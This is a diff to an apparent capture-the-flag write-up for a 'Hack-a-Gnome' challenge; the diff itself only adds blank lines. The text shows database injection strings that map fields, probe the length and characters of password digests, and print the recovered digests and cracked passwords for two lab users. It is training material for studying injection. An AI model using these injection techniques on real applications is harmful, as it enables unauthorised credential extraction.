@@ -53,6 +53,7 @@ Using the register functionality, it is possible to search for users using the s
 Using similar injection techniques, it is possible to map the database structure.  
 
 - 'harold" AND IS_DEFINED(c.id)--' is used to identify the field ID  (harold is ID=1, bruce is ID=2)
+
 - 'harold" AND IS_DEFINED(c.digest)--' is used to identify the field were the password digest is stored.
 
 Using trial and error, the length of the digest can be determined using the injection: 'harold" AND Length(c.digest) = 32--' 
@@ -66,6 +67,7 @@ Using the injection 'harold" AND STARTSWITH(c.digest) = "0"', it is possible to 
 ![Hack-a-Gnome Password Digest](/images/hack-a-gnome_digest.jpg) 
 
 Bruce digest: d0a9ba00f80cbc56584ef245ffc56b9e
+
 Harold digest: 07f456ae6a94cb68d740df548847f459
 
 Usiong crackstation.net, it is possible to crack both hashes.
@@ -73,6 +75,7 @@ Usiong crackstation.net, it is possible to crack both hashes.
 ![Hack-a-Gnome Password Digest Crack](/images/hack-a-gnome_digest_crack.jpg) 
 
 Bruce password: oatmeal12
+
 Harold password: oatmeal!!
 
 Once logged in we are presented with the Smart Gnome Control Center as Bruce:
